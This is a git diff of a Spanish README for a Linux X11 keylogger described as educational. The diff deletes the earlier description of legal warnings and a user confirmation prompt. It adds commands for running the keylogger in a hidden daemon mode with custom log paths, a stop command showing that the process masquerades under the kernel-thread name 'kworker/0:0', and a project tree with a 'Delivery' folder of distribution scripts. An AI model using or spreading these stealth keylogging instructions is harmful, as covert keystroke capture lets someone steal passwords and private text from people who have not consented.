@@ -82,20 +82,46 @@ make help
 
 ## 📖 Uso
 
+### Método Rápido (con Make)
+
 ```bash
-# Ejecutar el keylogger
-./x11_keylogger
+# Compilar y ejecutar en modo daemon
+make run
+
+# Detener
+make stop
 ```
 
-El programa:
+### Método con Scripts
 
-1. Mostrará advertencias legales
-2. Solicitará confirmación (escribir 's' para continuar)
-3. Comenzará a capturar eventos de teclado
-4. Guardará los eventos en `keylog.txt`
-5. Mostrará eventos en tiempo real en la consola
+```bash
+# Desde la raíz del proyecto
+bash scripts/run.sh     # Iniciar
+bash scripts/stop.sh    # Detener
+```
 
-**Para detener**: Presione `Ctrl+C`
+### Método Manual
+
+```bash
+# Compilar
+make
+
+# Ejecutar en modo normal (visible)
+./bin/x11_keylogger
+
+# Ejecutar en modo daemon (oculto)
+./bin/x11_keylogger -d
+
+# Ejecutar con log personalizado
+./bin/x11_keylogger -d -o /tmp/mi_log.txt
+
+# Ver ayuda
+./bin/x11_keylogger -h
+```
+
+**Para detener**: 
+- Modo normal: `Ctrl+C`
+- Modo daemon: `make stop` o `pkill -f "kworker/0:0"`
 
 ### Ejemplo de Salida
 
@@ -321,11 +347,23 @@ kill -9 $pid
 
 ``` bash
 KeyloggerEducativoParaLinuxX11/
-├── README.md                 # Este archivo
-├── DOCUMENTACION.md          # Documentación técnica detallada
-├── x11_keylogger.c          # Código fuente principal
-├── Makefile                 # Sistema de compilación
-└── keylog.txt              # Archivo de log (generado en ejecución)
+├── src/                      # Código fuente
+│   └── x11_keylogger.c
+├── bin/                      # Binarios compilados
+│   └── x11_keylogger
+├── scripts/                  # Scripts de ejecución
+│   ├── run.sh               # Iniciar en modo daemon
+│   ├── stop.sh              # Detener el keylogger
+│   └── demo.sh              # Demostración
+├── docs/                     # Documentación
+│   ├── DOCUMENTACION.md
+│   ├── INSTALACION.md
+│   ├── RESUMEN.md
+│   └── Delivery/            # Scripts de distribución
+├── Makefile                  # Sistema de compilación
+├── README.md
+├── LICENSE
+└── SECURITY.md
 ```
 
 ---
